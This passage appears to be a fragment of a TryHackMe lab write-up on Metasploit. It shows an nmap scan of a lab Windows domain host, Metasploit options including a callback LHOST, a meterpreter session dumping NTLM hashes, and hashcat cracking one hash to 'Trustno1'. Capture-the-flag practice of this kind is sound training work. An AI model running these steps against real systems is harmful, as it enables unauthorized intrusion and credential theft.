...
* Introduction to Metasploit: https://tryhackme.com/room/metasploitintro
...
##### Nmap scan.
```bash
sudo nmap -v -sS -sC -sV 10.10.155.86
...
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-23 03:29:05Z)
...
|   DNS_Tree_Name: FLASH.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-23T03:29:18+00:00
| ssl-cert: Subject: commonName=ACME-TEST.FLASH.local
| Issuer: commonName=ACME-TEST.FLASH.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-29T07:03:42
| Not valid after:  2022-01-28T07:03:42
| MD5:   11ce 3891 3c3d 5956 5092 d835 9e64 d7a7
|_SHA-1: 0dfb 1e3a 3e3a 4551 021f bc79 2449 376f 09fd 109d
|_ssl-date: 2021-11-23T03:29:57+00:00; +11s from scanner time.
...
show options
setg RHOSTS 10.10.155.86
set LHOST 10.13.25.242
set SMBUser ballen
...
##### Migrate to Another Process and Get NTLM Hashes
```bash
meterpreter > getpid
Current pid: 3796
...
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:3f1fe96f69e5fba43c1753d0c7fa0951:::
```

##### Crack Password Hash
```bash
hashcat -m 1000 -a 0 69596c7aa1e8daee17f8e78870e25a5c /usr/share/wordlists/rockyou.txt -O
69596c7aa1e8daee17f8e78870e25a5c:Trustno1
```

##### Search For Files and Get Contents
```bash
